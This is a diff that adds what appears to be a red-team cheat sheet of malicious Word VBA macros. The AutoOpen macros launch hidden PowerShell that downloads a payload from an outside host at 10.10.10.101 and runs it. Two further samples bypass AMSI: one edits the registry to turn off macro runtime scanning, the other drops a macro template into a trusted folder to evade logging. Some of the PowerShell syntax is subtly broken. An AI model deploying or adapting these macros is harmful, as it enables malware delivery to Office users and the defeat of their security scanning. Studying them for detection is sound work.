@@ -1,0 +1,60 @@
+# Download File & Exec
+Sub AutoOpen()
+Call Shell("cmd /c powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).downloadstring('http://10.10.10.101:8080/pl.txt','C:\Users\[username]\Desktop\payload.exe')")
+End Sub
+
+# Direct Exec
+Sub Auto_Open()
+Dim exec As String
+exec = "powershell.exe ""IEX (-ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object net.webclient).downloadstring('http://10.10.10.101:8080/pl.txt','C:\Users\[username]\Desktop\payload.exe'))"""
+Shell (exec)
+End Sub
+
+# Exec File and Bypass AMSI
+# Option one, using regedit in current dir
+Sub AutoOpen()
+    filepath = ActiveDocument.Path & "\"
+
+    ' set contents and save as reg file
+    Documents.Add
+    ActiveDocument.Range.Text = _
+        "Windows Registry Editor Version 5.00" & vbNewLine & vbNewLine & _
+         "[HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Common\security]" & vbNewLine & _
+         """MacroRuntimeScanScope""=dword:00000000" & vbNewLine & vbNewLine
+  
+    ActiveDocument.SaveAs2 FileName:=filepath & "generatedByWord.reg", LineEnding:=wdCRLF, FileFormat:=wdFormatText, Encoding:=437
+    ActiveDocument.Close
+  
+    ' set contents and save as bat file
+    Documents.Add
+    ActiveDocument.Range.Text = "regedit.exe /S generatedByWord.reg"
+      
+    ActiveDocument.SaveAs2 FileName:=filepath & "generatedByWord.bat", FileFormat:=wdFormatText, Encoding:=437, LineEnding:=wdCRLF
+    ActiveDocument.Close
+
+    Call Shell ("calc.exe")
+End Sub
+
+# Option two, load in appdata
+' ##################################################################################
+' AMSI Bypass approach that abuses trusted locations (sample for Word)  
+' ##################################################################################
+
+Sub autoopen()
+    'function called by the initial 'dropper' code, drops a dotm into %appdata\microsoft templates
+    curfile = ActiveDocument.Path & "\" & ActiveDocument.Name
+    templatefile = Environ("appdata") & "\Microsoft\Templates\" & DateDiff("s", #1/1/1970#, Now()) & ".dotm"
+
+    ActiveDocument.SaveAs2 FileName:=templatefile, FileFormat:=wdFormatXMLTemplateMacroEnabled, AddToRecentFiles:=True
+
+    ' save back to orig location, otherwise AMSI will kcik in (as we are the template)
+    ActiveDocument.SaveAs2 FileName:=curfile, FileFormat:=wdFormatXMLDocumentMacroEnabled
+
+    ' now create a new file based on template
+    Documents.Add Template:=templatefile, NewTemplate:=False, DocumentType:=0
+End Sub
+
+Sub autonew()
+    ' this function is called from a trusted location, not in the AMSI logs
+    Shell "calc.exe"
+End Sub
